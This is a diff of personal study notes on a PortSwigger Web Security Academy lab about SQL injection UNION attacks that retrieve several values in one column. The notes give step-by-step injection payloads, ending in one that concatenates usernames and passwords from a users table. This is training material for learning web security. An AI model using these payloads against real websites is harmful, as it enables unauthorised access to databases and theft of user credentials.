@@ -102,16 +102,37 @@ Episode5- YouTube Channel AcronProject
         4- Verify that the application's response contains usernames and passwords.
 
 
-Lab: SQL injection UNION attack, retrieving multiple values in a single column:
-        Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
-            My Solution:
-            #1 Detection + All the commands used = 
-                1- '                                                                             = Error = probably vulnerable
-                2- ''    => SELECT category = ''                                                 = Error = probably vulnerable
-                3- '+UNION+SELECT+NULL,'abc'-- => SELECT category = ''+UNION+SELECT+NULL,'abc'-- = print in browser = probably vulnerable 
-                                                                                                 = secend column is string
-                4- '+UNION+SELECT+'abc',NULL-- => SELECT category = '+UNION+SELECT+'abc',NULL--  = first column is probably string
+Episode6- YouTube Channel AcronProject:
+    Retrieving multiple values within a single column:
+        In the preceding example, suppose instead that the query only returns a single column.
+        You can easily retrieve multiple values together within this single column by concatenating the values together, 
+        ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
+            ' UNION SELECT username || '~' || password FROM users--
+        This uses the double-pipe sequence || which is a string concatenation operator on Oracle. 
+        The injected query concatenates together the values of the username and password fields, separated by the ~ character.
+        The results from the query will let you read all of the usernames and passwords, for example:
+            ...
+            administrator~s3cure
+            wiener~peter
+            carlos~montoya
+            ...
+        Note that different databases use different syntax to perform string concatenation. For more details, see the SQL injection cheat sheet. 
+            Source cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+    --------------------------------------------------------------------------------------------------------------------------------------------------
+    Lab: SQL injection UNION attack, retrieving multiple values in a single column:
+            Source: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
+                My Solution:
+                #1 Detection + All the commands used = 
+                    1- '     => SELECT category = '''  = Error = probably vulnerable
+                    2- ''    => SELECT category = '''' = Error = probably vulnerable
+                    3- '+UNION+SELECT+NULL,'abc'-- => SELECT category = ''+UNION+SELECT+NULL,'abc'-- = print in browser = probably vulnerable 
+                                                                                                    = secend column is string
+                    4- '+UNION+SELECT+'abc',NULL-- => SELECT category = '+UNION+SELECT+'abc',NULL--  = first column is probably string
+                    '+UNION+SELECT+123,NULL--
+                    5- '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+                                                => SELECT category = '+UNION+SELECT+NULL,"username~password"--
+                                                                                                    = get the usernames and password so this is vulnerable
 
-                5- '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
-                                               => SELECT category = '+UNION+SELECT+NULL,"username~password"--
-                                                                                                 = get the usernames and password so this is vulnerable
+
+
+
